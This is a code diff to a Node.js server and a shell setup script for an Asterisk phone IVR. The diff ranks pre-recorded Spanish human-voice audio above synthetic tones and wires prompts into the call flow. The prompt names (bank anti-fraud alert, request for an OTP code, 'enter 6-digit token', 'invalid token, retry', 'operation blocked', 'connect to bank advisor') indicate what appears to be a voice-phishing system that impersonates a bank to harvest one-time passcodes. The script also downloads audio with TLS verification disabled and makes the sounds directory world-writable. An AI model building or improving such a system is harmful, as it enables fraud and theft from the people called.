@@ -4949,8 +4949,32 @@ app.all('/api/asterisk/audio/verify', (req, res) => {
 // Download raw audio file for Asterisk sounds directory (/var/lib/asterisk/sounds/custom/...)
 app.get('/api/asterisk/audio/raw/:name', (req, res) => {
   const rawName = req.params.name.replace(/\.[^/.]+$/, '').replace(/[^a-zA-Z0-9_-]/g, '');
+  const assetWav = path.join(process.cwd(), 'public/assets', `${rawName}.wav`);
+  const assetGsm = path.join(process.cwd(), 'public/assets', `${rawName}.gsm`);
   const wavPath = path.join(SOUNDS_CUSTOM_DIR, `${rawName}.wav`);
   const gsmPath = path.join(SOUNDS_CUSTOM_DIR, `${rawName}.gsm`);
+
+  // 1. Priority: Pre-recorded human Spanish voice assets in public/assets
+  if (fs.existsSync(assetWav) && fs.statSync(assetWav).size > 1000) {
+    res.setHeader('Content-Type', 'audio/wav');
+    res.setHeader('Content-Disposition', `attachment; filename="${rawName}.wav"`);
+    return res.sendFile(assetWav);
+  }
+  if (fs.existsSync(assetGsm) && fs.statSync(assetGsm).size > 500) {
+    res.setHeader('Content-Type', 'audio/x-gsm');
+    res.setHeader('Content-Disposition', `attachment; filename="${rawName}.gsm"`);
+    return res.sendFile(assetGsm);
+  }
+
+  // 2. Sounds custom dir if size is greater than the old 56KB sine beep
+  if (fs.existsSync(wavPath) && fs.statSync(wavPath).size > 60000) {
+    res.setHeader('Content-Type', 'audio/wav');
+    return res.sendFile(wavPath);
+  }
+  if (fs.existsSync(gsmPath) && fs.statSync(gsmPath).size > 1000) {
+    res.setHeader('Content-Type', 'audio/x-gsm');
+    return res.sendFile(gsmPath);
+  }
 
   if (fs.existsSync(wavPath)) {
     return res.sendFile(wavPath);
@@ -4959,7 +4983,7 @@ app.get('/api/asterisk/audio/raw/:name', (req, res) => {
     return res.sendFile(gsmPath);
   }
 
-  // Generate Asterisk 8kHz PCM WAV on the fly with distinct frequencies
+  // Fallback: Generate Asterisk 8kHz PCM WAV
   let freq = 520;
   if (rawName.includes('otp')) freq = 680;
   if (rawName.includes('validando') || rawName.includes('wait')) freq = 440;
@@ -5019,20 +5043,28 @@ write = all
 EOF_MGR
 
 echo "=== [3/5] Descargando y verificando audios de IVR en /var/lib/asterisk/sounds/custom/ ==="
-AUDIOS=("alerta_banco_antifraude" "solicitar_codigo_otp" "digite_token_6_digitos" "token_invalido_reintente" "un_momento_validando_informacion" "operacion_bloqueada_exito" "conectar_asesor_banco" "bienvenida_corporativa" "prompt_otp_6_digitos" "bienvenida_7777" "bienvenida_6666" "bienvenida_5555" "bienvenida_4444" "bienvenida_3333")
+AUDIOS=("banrearreglado" "alerta_banco_antifraude" "solicitar_codigo_otp" "digite_token_6_digitos" "token_invalido_reintente" "un_momento_validando_informacion" "operacion_bloqueada_exito" "conectar_asesor_banco" "bienvenida_corporativa" "prompt_otp_6_digitos" "bienvenida_7777" "bienvenida_6666" "bienvenida_5555" "bienvenida_4444" "bienvenida_3333")
 for aud in "\${AUDIOS[@]}"; do
-  if [ ! -s "/var/lib/asterisk/sounds/custom/\${aud}.wav" ] && [ ! -s "/var/lib/asterisk/sounds/custom/\${aud}.gsm" ]; then
-    echo "  -> Obteniendo audio: \${aud}.wav..."
+  file_size=0
+  if [ -f "/var/lib/asterisk/sounds/custom/\${aud}.wav" ]; then
+    file_size=$(stat -c%s "/var/lib/asterisk/sounds/custom/\${aud}.wav" 2>/dev/null || echo 0)
+  fi
+  if [ ! -s "/var/lib/asterisk/sounds/custom/\${aud}.wav" ] || [ "\$file_size" -le 60000 ]; then
+    echo "  -> Obteniendo audio de voz humana: \${aud}.wav..."
     curl -sSLk "\${baseUrl}/api/asterisk/audio/raw/\${aud}" -o "/var/lib/asterisk/sounds/custom/\${aud}.wav" || true
   fi
 done
+chmod -R 777 /var/lib/asterisk/sounds
 
 echo "=== [4/5] Configurando base de datos interna AstDB ==="
-asterisk -rx 'database put ivr_vars default_intro custom/alerta_banco_antifraude' || true
+asterisk -rx 'database put ivr_vars default_intro custom/banrearreglado' || true
+asterisk -rx 'database put ivr_vars 8888_intro custom/banrearreglado' || true
+asterisk -rx 'database put ivr_vars default_action ivr-press1' || true
 asterisk -rx 'database put ivr_vars default_prompt custom/solicitar_codigo_otp' || true
 asterisk -rx 'database put ivr_vars default_wait custom/un_momento_validando_informacion' || true
 asterisk -rx 'database put ivr_vars default_success custom/operacion_bloqueada_exito' || true
 asterisk -rx 'database put ivr_vars default_agent custom/conectar_asesor_banco' || true
+asterisk -rx 'database put ivr_vars 8888_agent_exten 1001' || true
 
 asterisk -rx 'database put ivr_vars 7777_intro custom/bienvenida_7777' || true
 asterisk -rx 'database put ivr_vars 7777_prompt custom/bienvenida_7777' || true
